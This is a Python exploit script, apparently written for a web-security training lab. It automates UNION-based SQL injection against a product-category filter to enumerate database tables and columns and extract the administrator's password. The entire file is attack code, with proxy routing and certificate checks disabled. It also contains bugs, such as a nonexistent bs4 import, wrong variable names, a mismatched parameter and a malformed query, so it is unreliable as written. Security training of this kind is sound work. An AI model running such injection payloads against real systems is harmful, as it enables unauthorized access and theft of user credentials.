import requests
import sys
import urllib3
from bs4 import BeautifulSoup, soup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}
def makeRequest(url,payload):
    path='/filter?category=Gifts'
    r=requests.get(url+path+payload, proxies=proxies,verify=False)
    text=r.text #the whole data is considered as a single string
    return text

def tbName(url):
    payload= "'+union+select+table_name,+null+from+information_schema.tables--+"
    text = makeRequest(url,payload)
    parse=BeautifulSoup(text,'html.parser')
    table_name= soup.find(text=re.compile('^USERS_'))
    return table_name
def coName(url,table_name):
    payload= f"'+union+select+column_name,+null+FROM+information_schema.columns+WHERE+table_name='{table_name}'-- "
    r=makeRequest(url,payload)
    parse = BeautifulSoup(r,'html.parser')
    Username_col= soup.find(text= re.compile('.*USERNAME.*'))
    password_col= soup.find(text=re.compile('.*PASSWORD.*'))
    return Username_col,password_col
def adPass(base_url,table_name,username_columns,password_column):
    payload= f"'+UNION+SELECT+'{username_column}','{password_column}'+FROM+'{table_name}'"
    r=makeRequest(base_url,payload)
    parse=BeautifulSoup(r,'html.parser')
    admin_pass= parse.find(text="administrator").parent.findNext('td').contents[0]
    return admin_pass


if __name__=='__main__':
    try:
        base_url=sys.argv[1].strip()
    except IndexError:
        print("Usage: python script.py <url>")
    table_name= tbName(base_url)
    if table_name:
        print(f"The table that contain the user name and password is {table_name}")
        username_column,password_column = coName(base_url, table_name)
        if username_column and password_column:
            print(f"the username and password column names are {username_column}and {password_column}")
            admin_pass= adPass(base_url,table_name,username_column,password_column)
            if admin_pass:
                print("The admini password is %s" %admin_pass)

        else:
            print("Didn't find username and password columns")
    else:
        print("Did not find the table")
        



